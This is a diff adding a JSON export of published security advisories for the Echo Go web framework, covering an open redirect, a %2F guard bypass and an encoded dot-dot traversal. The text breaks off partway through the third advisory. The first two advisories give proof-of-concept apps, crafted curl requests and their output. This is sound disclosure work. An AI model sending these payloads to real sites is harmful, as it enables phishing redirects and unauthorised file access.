@@ -1,0 +1,1781 @@
+{
+  "advisories": [
+    {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "comments": 0,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "zerovulnlabs",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/322870032?v=4",
+            "events_url": "https://api.github.com/users/zerovulnlabs/events{/privacy}",
+            "followers_url": "https://api.github.com/users/zerovulnlabs/followers",
+            "following_url": "https://api.github.com/users/zerovulnlabs/following{/other_user}",
+            "gists_url": "https://api.github.com/users/zerovulnlabs/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/zerovulnlabs",
+            "id": 322870032,
+            "login": "zerovulnlabs",
+            "node_id": "U_kgDOEz6bEA",
+            "organizations_url": "https://api.github.com/users/zerovulnlabs/orgs",
+            "received_events_url": "https://api.github.com/users/zerovulnlabs/received_events",
+            "repos_url": "https://api.github.com/users/zerovulnlabs/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/zerovulnlabs/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/zerovulnlabs/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/zerovulnlabs",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": null,
+      "cvss": {
+        "score": 6.1,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 6.1,
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-601"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-601",
+          "name": "URL Redirection to Untrusted Site ('Open Redirect')"
+        }
+      ],
+      "description": "## Summary\n\nEcho's dedicated open-redirect guard, `sanitizeURI`, decides whether a redirect target is a local path by inspecting exactly two byte positions: `uri[0]` and `uri[1]`. If the value begins with a control character such as a tab or a newline, followed by a separator pair, the guard does not fire and the value is written to the `Location` header unchanged.\n\nBrowsers remove tab and newline characters from URLs before parsing them, and treat a backslash as a forward slash for HTTP and HTTPS URLs. A `Location` value of ``/\\t/attacker.example`` is therefore resolved by the browser as an absolute URL on `attacker.example`. Confirmed end to end in a headless browser.\n\n## Technical background\n\n### The guard\n\n`middleware/slash.go:144` (duplicated verbatim at `echo.go:958`):\n\n```go\nfunc sanitizeURI(uri string) string {\n\t// double slash `\\\\`, `//` or even `\\/` is absolute uri for browsers and by redirecting request to that uri\n\t// we are vulnerable to open redirect attack. so replace all slashes from the beginning with single slash\n\tif len(uri) > 1 && (uri[0] == '\\\\' || uri[0] == '/') && (uri[1] == '\\\\' || uri[1] == '/') {\n\t\turi = \"/\" + strings.TrimLeft(uri, `/\\`)\n\t}\n\treturn uri\n}\n```\n\nThe condition is anchored at absolute offsets 0 and 1. It cannot see a separator that has been shifted by one byte.\n\n### Data flow\n\n1. `RemoveTrailingSlash` (`middleware/slash.go:112-140`) reads `url.Path`, which `net/http` has already percent-decoded, strips the trailing slash, and appends the raw query string:\n\n```go\npath := url.Path\n...\nif l > 0 && strings.HasSuffix(path, \"/\") {\n    path = path[:l]\n    uri := path\n    if qs != \"\" {\n        uri += \"?\" + qs\n    }\n    if config.RedirectCode != 0 {\n        return c.Redirect(config.RedirectCode, sanitizeURI(uri))   // line 132\n    }\n```\n\n2. `AddTrailingSlash` does the same in the opposite direction at `middleware/slash.go:67`.\n\n3. A request for `/%09/attacker.example/x/` has `url.Path` equal to `\"/\\t/attacker.example/x/\"` (a literal TAB byte). `sanitizeURI` evaluates `uri[0] == '\\t'`, the condition is false, and the value passes through untouched.\n\n4. `Context.Redirect` (`context.go:735`) writes it to the `Location` header. Go's header writer removes CR and LF but leaves TAB, which is all that is required.\n\n### Conditional analysis\n\n- Guard: `uri[0]` and `uri[1]` are separators. Trust boundary: server-side sanitization of attacker-influenced path data.\n- Bypass: place a single control byte before the separator pair. The separator moves to index 1 and the guard's second condition (`uri[1]` being a separator) is never reached because the first condition (`uri[0]` being a separator) already failed.\n- Browser-side trust boundary: the client's URL parser. It is adversary favourable: control characters are stripped and backslashes are normalized before scheme and authority parsing. The attacker does not need any server-side weakness beyond producing the malformed `Location`.\n\nNote that the newline variant does not survive: `net/http` replaces CR and LF in header values. TAB does survive, and TAB alone is sufficient because the browser strips it.\n\n## Proof of concept\n\n**Attached PoC:** `ECHO-2026-002_poc.zip` (in this directory). Extract it and follow\n`ECHO-2026-002/README.md` for the full walkthrough. The archive contains a\nself-contained Go module (`go.mod`, `go.sum`, `main.go`, `README.md`).\n\n[ECHO-2026-002_poc.zip](https://github.com/user-attachments/files/32133975/ECHO-2026-002_poc.zip)\n\nQuick start:\n\n```bash\nunzip ECHO-2026-002_poc.zip\ncd ECHO-2026-002\n# edit go.mod: point the replace directive at your Echo checkout\nsed -i 's|=> .*|=> /absolute/path/to/echo|' go.mod\nGOFLAGS=-mod=mod go run .          # in-process check\nGOFLAGS=-mod=mod go run . -serve   # real listener on 127.0.0.1:18002\n```\n\n### Environment used for verification\n\n- OS: Linux 6.18.33.2-microsoft-standard-WSL2, x86_64\n- Go: go1.27.0 linux/amd64\n- Target: Echo v5.3.1 (module `github.com/labstack/echo/v5`)\n- Browser: headless Chromium drove the end-to-end confirmation\n\n### The vulnerable configuration\n\n```go\npackage main\n\nimport (\n    \"net/http\"\n\n    \"github.com/labstack/echo/v5\"\n    \"github.com/labstack/echo/v5/middleware\"\n)\n\nfunc main() {\n    e := echo.New()\n    e.Pre(middleware.RemoveTrailingSlashWithConfig(middleware.RemoveTrailingSlashConfig{\n        RedirectCode: http.StatusMovedPermanently,\n    }))\n    e.GET(\"/\", func(c *echo.Context) error { return c.String(200, \"home\") })\n    _ = e.Start(\"127.0.0.1:18002\")\n}\n```\n\n***\n\n### Reproduction\n\nIn-process check. The program requests five path shapes and applies the browser\nURL-parsing steps that matter (strip TAB, LF, CR; treat a backslash as a slash; a\nleading `//` starts an authority):\n\n```bash\nGOFLAGS=-mod=mod go run .\n```\n\n```\nGET                          code   Location (control chars shown) browser navigates to\n/normal/path/                301    /normal/path           (victim origin)\n                             control: ordinary path, sanitized correctly\n/%09/attacker.example/x/     301    /^I/attacker.example/x attacker.example\n                             exploit: TAB then slash\n/%09%5Cattacker.example/x/   301    /^I\\attacker.example/x attacker.example\n                             exploit: TAB then backslash\n/..%09/attacker.example/     301    /..^I/attacker.example (victim origin)\n                             NOT exploitable: TAB is not at index 1\n/%09//attacker.example/      301    /^I//attacker.example  (victim origin)\n                             NOT exploitable: three slashes is an empty authority\n\nRESULT: reproducible. ...\n```\n\n`^I` is a literal TAB byte. The last two rows are deliberate negatives, included\nso the mechanism (the guard reads only `uri[0]` and `uri[1]`) is unambiguous.\n\nOver the wire, with the `-serve` variant running on `127.0.0.1:18002`:\n\n1. Show the malformed `Location` on the wire. No backslash is needed for this variant:\n\n```bash\ncurl -s -i --max-time 5 'http://127.0.0.1:18002/%09/attacker.example/x/' | cat -A | head -3\n# HTTP/1.1 301 Moved Permanently\n# Location: /^I/attacker.example/x\n```\n\n`cat -A` renders the tab as `^I`, confirming it is a literal byte in the header.\n\n2. Show that LF does NOT work, which proves the mechanism is the guard's fixed\n   byte offsets rather than generic header injection:\n\n```bash\ncurl -s -i --max-time 5 'http://127.0.0.1:18002/%0A/attacker.example/x/' | cat -A | head -3\n# Location: / /attacker.example/x     (net/http rewrote LF to a space)\n```\n\n3. Confirm a browser leaves the origin. Start any HTTP server on port 18099, then\n   open this URL in a browser:\n\n```\nhttp://127.0.0.1:18002/%09/127.0.0.1:18099/x/\n```\n\nObserved in headless Chromium:\n\n```\nfinalUrl: http://127.0.0.1:18099/x\n```\n\nThe browser left the victim origin entirely, so this is a working open redirect,\nnot merely a suspicious header.\n\nExit status `0` means the finding reproduced; `1` means an expectation was\nviolated.\n\n## Impact\n\nAn attacker can craft a link on the victim domain that redirects the victim to an arbitrary external site. Practical consequences:\n\n- Phishing: the trusted domain name appears in the link and in the initial navigation, which defeats the usual \"check the domain\" advice.\n- OAuth and SSO token theft: any flow that permits a redirect target on the trusted origin and relies on that origin's redirects being local can be chained to leak authorization codes or access tokens.\n- Referrer and cache poisoning of downstream logic that treats the victim origin's redirects as trustworthy.\n\nThe client must follow the redirect (user interaction is required), which is why this is scored Medium rather than High, but open redirects on authentication-adjacent origins routinely escalate in practice.\n\n## Recommended fixes\n\nNormalize before deciding, instead of probing two fixed offsets.\n\n```go\nfunc sanitizeURI(uri string) string {\n\t// Strip control characters that browsers remove before parsing, so they cannot\n\t// be used to shift a separator out of the checked positions.\n\turi = strings.Map(func(r rune) rune {\n\t\tif r < 0x20 || r == 0x7f {\n\t\t\treturn -1\n\t\t}\n\t\treturn r\n\t}, uri)\n\t// Collapse any leading separator run (both slash kinds) to a single slash.\n\tif strings.ContainsAny(uri[:min(len(uri), 1)], `/\\`) {\n\t\ttrimmed := strings.TrimLeft(uri, `/\\`)\n\t\tif len(trimmed) != len(uri) {\n\t\t\treturn \"/\" + trimmed\n\t\t}\n\t}\n\treturn uri\n}\n```\n\nAdditional hardening:\n\n1. Reject the request with 400 when the decoded path contains control characters, rather than attempting to sanitize. A path containing a raw TAB or NUL is malformed under RFC 3986 and has no legitimate use.\n2. Apply the same normalization to the `Location` value in `Context.Redirect` so every caller benefits, instead of relying on each call site to call `sanitizeURI`.\n3. Add a regression test for each variant (`%09/`, `%09%5C`, `%0A/`) against both trailing-slash middlewares. There is currently no test that asserts `sanitizeURI` behavior at all.\n\n## Patches\n\nFixed in `github.com/labstack/echo/v5` v5.4.0 and `github.com/labstack/echo/v4` v4.16.0. The trailing slash middlewares and the static directory redirect percent-encode control characters in the redirect path before collapsing leading slashes, so a browser can no longer be sent to another host.\n\n## Workarounds\n\nUse the trailing slash middlewares without `RedirectCode` (the default rewrites the path internally instead of redirecting), or reject request paths that contain control characters before these middlewares.\n",
+      "ghsa_id": "GHSA-v753-g4cw-jm48",
+      "html_url": "https://github.com/labstack/echo/security/advisories/GHSA-v753-g4cw-jm48",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-v753-g4cw-jm48"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2026-09-27T23:04:08Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/314036?v=4",
+        "events_url": "https://api.github.com/users/vishr/events{/privacy}",
+        "followers_url": "https://api.github.com/users/vishr/followers",
+        "following_url": "https://api.github.com/users/vishr/following{/other_user}",
+        "gists_url": "https://api.github.com/users/vishr/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/vishr",
+        "id": 314036,
+        "login": "vishr",
+        "node_id": "MDQ6VXNlcjMxNDAzNg==",
+        "organizations_url": "https://api.github.com/users/vishr/orgs",
+        "received_events_url": "https://api.github.com/users/vishr/received_events",
+        "repos_url": "https://api.github.com/users/vishr/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/vishr/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/vishr/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/vishr",
+        "user_view_type": "public"
+      },
+      "severity": "medium",
+      "state": "published",
+      "submission": null,
+      "summary": "Open Redirect via Control-Character Prefix Defeating sanitizeURI",
+      "updated_at": "2026-09-27T23:04:08Z",
+      "url": "https://api.github.com/repos/labstack/echo/security-advisories/GHSA-v753-g4cw-jm48",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "go",
+            "name": "github.com/labstack/echo/v5"
+          },
+          "patched_versions": "5.4.0",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 5.4.0"
+        },
+        {
+          "package": {
+            "ecosystem": "go",
+            "name": "github.com/labstack/echo/v4"
+          },
+          "patched_versions": "4.16.0",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 4.16.0"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "comments": 1,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "Adobodoo",
+          "type": "reporter"
+        },
+        {
+          "login": "manus-use",
+          "type": "finder"
+        },
+        {
+          "login": "kta1kri",
+          "type": "finder"
+        },
+        {
+          "login": "zerovulnlabs",
+          "type": "finder"
+        },
+        {
+          "login": "benzdeus",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/24790047?v=4",
+            "events_url": "https://api.github.com/users/Adobodoo/events{/privacy}",
+            "followers_url": "https://api.github.com/users/Adobodoo/followers",
+            "following_url": "https://api.github.com/users/Adobodoo/following{/other_user}",
+            "gists_url": "https://api.github.com/users/Adobodoo/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/Adobodoo",
+            "id": 24790047,
+            "login": "Adobodoo",
+            "node_id": "MDQ6VXNlcjI0NzkwMDQ3",
+            "organizations_url": "https://api.github.com/users/Adobodoo/orgs",
+            "received_events_url": "https://api.github.com/users/Adobodoo/received_events",
+            "repos_url": "https://api.github.com/users/Adobodoo/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/Adobodoo/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/Adobodoo/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/Adobodoo",
+            "user_view_type": "public"
+          }
+        },
+        {
+          "state": "accepted",
+          "type": "finder",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/213290975?v=4",
+            "events_url": "https://api.github.com/users/manus-use/events{/privacy}",
+            "followers_url": "https://api.github.com/users/manus-use/followers",
+            "following_url": "https://api.github.com/users/manus-use/following{/other_user}",
+            "gists_url": "https://api.github.com/users/manus-use/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/manus-use",
+            "id": 213290975,
+            "login": "manus-use",
+            "node_id": "U_kgDODLaP3w",
+            "organizations_url": "https://api.github.com/users/manus-use/orgs",
+            "received_events_url": "https://api.github.com/users/manus-use/received_events",
+            "repos_url": "https://api.github.com/users/manus-use/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/manus-use/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/manus-use/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/manus-use",
+            "user_view_type": "public"
+          }
+        },
+        {
+          "state": "accepted",
+          "type": "finder",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/77656895?v=4",
+            "events_url": "https://api.github.com/users/kta1kri/events{/privacy}",
+            "followers_url": "https://api.github.com/users/kta1kri/followers",
+            "following_url": "https://api.github.com/users/kta1kri/following{/other_user}",
+            "gists_url": "https://api.github.com/users/kta1kri/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/kta1kri",
+            "id": 77656895,
+            "login": "kta1kri",
+            "node_id": "MDQ6VXNlcjc3NjU2ODk1",
+            "organizations_url": "https://api.github.com/users/kta1kri/orgs",
+            "received_events_url": "https://api.github.com/users/kta1kri/received_events",
+            "repos_url": "https://api.github.com/users/kta1kri/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/kta1kri/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/kta1kri/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/kta1kri",
+            "user_view_type": "public"
+          }
+        },
+        {
+          "state": "accepted",
+          "type": "finder",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/322870032?v=4",
+            "events_url": "https://api.github.com/users/zerovulnlabs/events{/privacy}",
+            "followers_url": "https://api.github.com/users/zerovulnlabs/followers",
+            "following_url": "https://api.github.com/users/zerovulnlabs/following{/other_user}",
+            "gists_url": "https://api.github.com/users/zerovulnlabs/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/zerovulnlabs",
+            "id": 322870032,
+            "login": "zerovulnlabs",
+            "node_id": "U_kgDOEz6bEA",
+            "organizations_url": "https://api.github.com/users/zerovulnlabs/orgs",
+            "received_events_url": "https://api.github.com/users/zerovulnlabs/received_events",
+            "repos_url": "https://api.github.com/users/zerovulnlabs/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/zerovulnlabs/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/zerovulnlabs/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/zerovulnlabs",
+            "user_view_type": "public"
+          }
+        },
+        {
+          "state": "accepted",
+          "type": "finder",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/53105746?v=4",
+            "events_url": "https://api.github.com/users/benzdeus/events{/privacy}",
+            "followers_url": "https://api.github.com/users/benzdeus/followers",
+            "following_url": "https://api.github.com/users/benzdeus/following{/other_user}",
+            "gists_url": "https://api.github.com/users/benzdeus/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/benzdeus",
+            "id": 53105746,
+            "login": "benzdeus",
+            "node_id": "MDQ6VXNlcjUzMTA1NzQ2",
+            "organizations_url": "https://api.github.com/users/benzdeus/orgs",
+            "received_events_url": "https://api.github.com/users/benzdeus/received_events",
+            "repos_url": "https://api.github.com/users/benzdeus/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/benzdeus/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/benzdeus/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/benzdeus",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": null,
+      "cvss": {
+        "score": 7.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 7.5,
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-177",
+        "CWE-863"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-177",
+          "name": "Improper Handling of URL Encoding (Hex Encoding)"
+        },
+        {
+          "cwe_id": "CWE-863",
+          "name": "Incorrect Authorization"
+        }
+      ],
+      "description": "## Summary\n\nWhen `middleware.Static` is mounted globally (`e.Use(middleware.Static(...))`) and an application relies on a **route- or group-level middleware guard** to restrict a path that also falls under the served static root, a `%2F`-encoded request bypasses that guard while the file is still served. This is the same encoding/decoding mismatch fixed for `StaticFS`/`StaticDirectoryHandler` in CVE-2026-55677 / GHSA-vfp3-v2gw-7wfq, but the fix did not cover the `middleware.Static` path. In addition, the `StaticConfig.EnablePathUnescaping` docstring states the default configuration prevents exactly this bypass, which is inaccurate for the global-mount case.\n\n**This is not path traversal:** no file outside the static root is accessed. The served file lives inside the static root; the issue is that access-control expectations set by a route guard are inconsistent between the literal and `%2F`-encoded forms of the same path.\n\n## Details\n\nRoot cause — the router and the static handler disagree on how to interpret `%2F`:\n\n- The router matches routes on the **raw, still-encoded** path, so `GET /admin%2Fsecret.txt` does **not** match a `/admin/...` route or group; any middleware attached to that route/group is therefore skipped.\n- `middleware.Static` selects its path source in `middleware/static.go` (~L219): with a global `e.Use` mount there is no wildcard route, so it uses `c.Request().URL.Path`, which `net/http` has already **decoded** (`%2F` → `/`). It then `path.Clean`s (~L235) and `Open`s (~L259) `admin/secret.txt`, serving the file.\n\nNet effect: for the literal path the guard runs; for the `%2F`-encoded path the guard is skipped but the same file is served.\n\nRelevant code:\n- `middleware/static.go` ~L219 (`p := c.Request().URL.Path`), ~L235 (`path.Clean`), ~L259 (`currentFS.Open`)\n- `StaticConfig.EnablePathUnescaping` docstring (`static.go` ~L60-67) — claims the default prevents the `/admin%2fprivate.txt` → `/admin/*` guard bypass; this is not true for the global mount.\n\nRelationship to prior advisories:\n- **CVE-2026-55677 / GHSA-vfp3-v2gw-7wfq** (patched 5.2.0): same `%2F` router-vs-handler mismatch, but fixed for `StaticFS`/`StaticDirectoryHandler`. The `middleware.Static` path was not covered — this report is that gap.\n- **CVE-2026-25766 / GHSA-pgvm-wxw2-hrv9** (patched 5.0.3): a *different* issue (Windows backslash traversal **outside** the root). Referenced only to disambiguate; not the same as this report.\n\n## PoC\n\nEnvironment: `golang:1.25`, module using the official release (`go get github.com/labstack/echo/v5@v5.3.1`, no local `replace`). Static root `public/` contains a marker file `public/admin/secret.txt` = `SECRET`.\n\nMinimal app (the pattern under test: static served globally + a group guard intended to protect `/admin`):\n\n```go\npackage main\n\nimport (\n\t\"net/http\"\n\n\t\"github.com/labstack/echo/v5\"\n\t\"github.com/labstack/echo/v5/middleware\"\n)\n\nfunc main() {\n\te := echo.New()\n\te.Use(middleware.Static(\"public\")) // serves ./public globally (default filesystem)\n\n\tadmin := e.Group(\"/admin\", func(next echo.HandlerFunc) echo.HandlerFunc {\n\t\treturn func(c *echo.Context) error { return c.String(http.StatusUnauthorized, \"auth required\") }\n\t})\n\tadmin.GET(\"/secret.txt\", func(c *echo.Context) error { return c.String(http.StatusOK, \"handler\") })\n\n\te.Start(\":1323\")\n}\n```\n\nRequests (unauthenticated):\n\n```\n# Literal: route matches -> group guard runs\ncurl -i http://localhost:1323/admin/secret.txt\n# => 401\n\n# %2F-encoded: route does NOT match -> guard skipped, but middleware.Static serves the file\ncurl -i --path-as-is http://localhost:1323/admin%2Fsecret.txt\n# => 200, body: SECRET\n```\n\nObserved on `v5.3.1`: literal → `401`; `%2F` → `200` with the file contents. For contrast, serving via the (patched) `e.StaticFS(\"/\")` returns `404` for the same `%2F` request, showing the `middleware.Static` path was not covered by the CVE-2026-55677 fix.\n\n## Impact\n\nAn unauthenticated remote user can retrieve a file served by `middleware.Static` even when the application attached a route/group middleware guard to that path, by substituting `/` with `%2F`. The consequence is limited to files already inside the served static root (CWE-863 authorization inconsistency; CWE-436 interpretation conflict) — **there is no access to files outside the static root**.\n\n**Honest caveat on validity / severity:** this only has security impact for applications that (a) serve a directory statically to the public *and* (b) place a sensitive file inside that same directory while relying on a *route-level* guard to protect it. That combination is arguably a misconfiguration — a statically-served directory is public by design — so maintainers may reasonably classify this as a documentation fix (correct the `EnablePathUnescaping` claim) or won't-fix rather than a code vulnerability. It is filed primarily because (1) the router-vs-handler `%2F` inconsistency is the exact class fixed in CVE-2026-55677 but left uncovered for `middleware.Static`, and (2) the docstring currently promises protection it does not provide.\n\n## Patches\n\nFixed in `github.com/labstack/echo/v5` v5.4.0 and `github.com/labstack/echo/v4` v4.16.0. With the default settings, the Static middleware resolves files from the same form of the path that the router matched, so percent-encoded paths such as `/admin%2Fsecret.txt` or `/%61dmin/secret.txt` no longer reach a file under a guarded route. Paths with `.`, `..` or empty segments are no longer served.\n\nNote: middleware registered with `Echo#Use` runs before route and group middleware, so route guards never protect files served by a global Static middleware. Keep protected files outside its root directory, or serve them with `Echo#Static` behind the guard.\n\n## Workarounds\n\nKeep files that need protection outside the Static middleware's root directory.\n",
+      "ghsa_id": "GHSA-375p-5qhx-8wq4",
+      "html_url": "https://github.com/labstack/echo/security/advisories/GHSA-375p-5qhx-8wq4",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-375p-5qhx-8wq4"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2026-09-27T23:04:09Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/314036?v=4",
+        "events_url": "https://api.github.com/users/vishr/events{/privacy}",
+        "followers_url": "https://api.github.com/users/vishr/followers",
+        "following_url": "https://api.github.com/users/vishr/following{/other_user}",
+        "gists_url": "https://api.github.com/users/vishr/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/vishr",
+        "id": 314036,
+        "login": "vishr",
+        "node_id": "MDQ6VXNlcjMxNDAzNg==",
+        "organizations_url": "https://api.github.com/users/vishr/orgs",
+        "received_events_url": "https://api.github.com/users/vishr/received_events",
+        "repos_url": "https://api.github.com/users/vishr/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/vishr/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/vishr/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/vishr",
+        "user_view_type": "public"
+      },
+      "severity": "high",
+      "state": "published",
+      "submission": null,
+      "summary": "middleware.Static: `%2F`-encoded path bypasses route/group middleware guarding a statically-served path (incomplete fix of CVE-2026-55677); `EnablePathUnescaping` docstring over-promises",
+      "updated_at": "2026-09-27T23:04:09Z",
+      "url": "https://api.github.com/repos/labstack/echo/security-advisories/GHSA-375p-5qhx-8wq4",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "go",
+            "name": "github.com/labstack/echo/v5"
+          },
+          "patched_versions": "5.4.0",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 5.4.0"
+        },
+        {
+          "package": {
+            "ecosystem": "go",
+            "name": "github.com/labstack/echo/v4"
+          },
+          "patched_versions": "4.16.0",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 4.16.0"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "comments": 2,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "DavidCarliez",
+          "type": "reporter"
+        },
+        {
+          "login": "kta1kri",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/271374756?v=4",
+            "events_url": "https://api.github.com/users/DavidCarliez/events{/privacy}",
+            "followers_url": "https://api.github.com/users/DavidCarliez/followers",
+            "following_url": "https://api.github.com/users/DavidCarliez/following{/other_user}",
+            "gists_url": "https://api.github.com/users/DavidCarliez/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/DavidCarliez",
+            "id": 271374756,
+            "login": "DavidCarliez",
+            "node_id": "U_kgDOECzZpA",
+            "organizations_url": "https://api.github.com/users/DavidCarliez/orgs",
+            "received_events_url": "https://api.github.com/users/DavidCarliez/received_events",
+            "repos_url": "https://api.github.com/users/DavidCarliez/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/DavidCarliez/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/DavidCarliez/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/DavidCarliez",
+            "user_view_type": "public"
+          }
+        },
+        {
+          "state": "accepted",
+          "type": "finder",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/77656895?v=4",
+            "events_url": "https://api.github.com/users/kta1kri/events{/privacy}",
+            "followers_url": "https://api.github.com/users/kta1kri/followers",
+            "following_url": "https://api.github.com/users/kta1kri/following{/other_user}",
+            "gists_url": "https://api.github.com/users/kta1kri/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/kta1kri",
+            "id": 77656895,
+            "login": "kta1kri",
+            "node_id": "MDQ6VXNlcjc3NjU2ODk1",
+            "organizations_url": "https://api.github.com/users/kta1kri/orgs",
+            "received_events_url": "https://api.github.com/users/kta1kri/received_events",
+            "repos_url": "https://api.github.com/users/kta1kri/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/kta1kri/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/kta1kri/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/kta1kri",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": null,
+      "cvss": {
+        "score": 5.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 5.9,
+          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-22"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-22",
+          "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+        }
+      ],
+      "description": "## Summary\n\nEcho v5.2.0 contains a bypass of the fix for GHSA-vfp3-v2gw-7wfq. The fix rejects encoded path separators such as `%2F` and `%5C` before static file path unescaping, but two traversal forms still bypass route-level middleware protections for static files.\n\nThe primary bypass uses encoded dot-dot segments. A request such as `/public/%2E%2E/admin/secret.txt` passes the encoded-separator guard, is unescaped to `public/../admin/secret.txt`, then `path.Clean` resolves it to `admin/secret.txt`. If `/admin/*` is protected by middleware but the static filesystem is mounted at `/`, the protected file is returned through the public static route.\n\nA second bypass exists when `UseEscapedPathForMatching=true`. In that mode, the router normalizes encoded separators before the static handler checks the wildcard. The handler receives a decoded wildcard with no `%` characters, so the encoded-separator guard does not run on the original encoded path.\n\n## Impact\n\nAn unauthenticated attacker can read files that an application intended to protect with route-level middleware, when those files are also reachable through a static filesystem mount after path normalization.\n\nThe high-severity variant works with the default router configuration and requires only encoded dot-dot path segments. The direct protected route returns 403, while the public static route returns the protected file content.\n\nThe `UseEscapedPathForMatching=true` variant is lower severity because it requires a non-default router configuration.\n\n## Affected versions\n\nTested vulnerable:\n\n- `github.com/labstack/echo/v5` v5.2.0\n- Current `master` at 